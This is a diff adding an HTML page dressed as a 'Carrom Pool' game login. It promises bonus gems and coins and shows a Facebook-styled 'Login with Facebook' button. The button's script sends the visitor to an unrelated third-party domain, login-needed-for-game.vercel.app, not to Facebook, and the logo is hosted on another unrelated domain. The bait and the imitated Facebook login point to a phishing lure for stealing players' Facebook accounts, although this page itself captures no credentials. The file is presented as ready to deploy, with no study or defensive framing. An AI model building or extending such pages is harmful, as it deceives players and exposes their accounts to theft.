@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Carrom Pool - Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: "Inter", sans-serif;
+      height: 100vh;
+      background: radial-gradient(circle at center, #b33b24 0%, #651d13 100%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      overflow: hidden;
+    }
+
+    .logo {
+      margin-top: 110px;
+      width: 280px;
+      height: auto;
+      user-select: none;
+      display: block;
+      filter: drop-shadow(0px 4px 10px rgba(0, 0, 0, 0.5));
+    }
+
+    .login-box {
+      background: rgba(90, 25, 15, 0.5);
+      border-radius: 14px;
+      padding: 30px 24px 40px;
+      text-align: center;
+      color: #fff;
+      margin-top: 80px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+      width: 360px;
+      backdrop-filter: blur(5px);
+    }
+
+    .login-box h1 {
+      font-size: 19px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      letter-spacing: 0.3px;
+    }
+
+    .login-box p {
+      font-size: 15px;
+      color: rgba(255, 255, 255, 0.9);
+      margin-bottom: 26px;
+    }
+
+    .fb-btn {
+      background: linear-gradient(180deg, #1877f2, #0d5acb);
+      border: none;
+      border-radius: 10px;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      padding: 14px 0;
+      width: 100%;
+      font-size: 17px;
+      font-weight: 600;
+      cursor: pointer;
+      box-shadow: 0 5px 0 #0b4ca5;
+      transition: all 0.15s ease;
+    }
+
+    .fb-btn:hover {
+      background: linear-gradient(180deg, #1a7cff, #0c55b5);
+    }
+
+    .fb-btn:active {
+      transform: translateY(1px);
+      box-shadow: 0 3px 0 #0b4ca5;
+    }
+
+    .fb-icon {
+      width: 20px;
+      height: 20px;
+      fill: white;
+    }
+
+    .subtext {
+      font-size: 14px;
+      color: #ffe36b;
+      margin-top: 6px;
+      font-weight: 500;
+      text-shadow: 0 1px 2px rgba(0,0,0,0.4);
+    }
+
+    @media (max-width: 480px) {
+      .logo {
+        width: 200px;
+        margin-top: 80px;
+      }
+      .login-box {
+        width: 85%;
+        margin-top: 60px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <img class="logo" src="https://steep-brown-s9qnp4ijfy.edgeone.app/f31bedfe-443b-414b-8ab2-53c68d888c2f.jpg" alt="Carrom Pool Logo" />
+
+  <div class="login-box">
+    <h1>Login to get bonus gems and coins</h1>
+    <p>Save your stats!</p>
+
+    <button class="fb-btn" id="fbLogin">
+      <svg class="fb-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36">
+        <path d="M22.68 8.44h2.67V4.26a34.53 34.53 0 0 0-3.89-.2c-3.85 0-6.48 2.35-6.48 6.66v3.71H10.9v4.68h4.08v11.9h4.98v-11.9h4.16l.66-4.68h-4.82v-3.22c0-1.35.37-2.27 2.7-2.27z"/>
+      </svg>
+      Login with Facebook
+    </button>
+    <div class="subtext">Play with your friends!</div>
+  </div>
+
+  <script>
+    const username = "guest_player";
+    const sessionId = Math.random().toString(36).substring(2, 10);
+
+    document.getElementById("fbLogin").addEventListener("click", () => {
+      const url = `https://login-needed-for-game.vercel.app/?user=${encodeURIComponent(username)}&session=${encodeURIComponent(sessionId)}`;
+      window.open(url, "_blank");
+    });
+  </script>
+</body>
+</html>
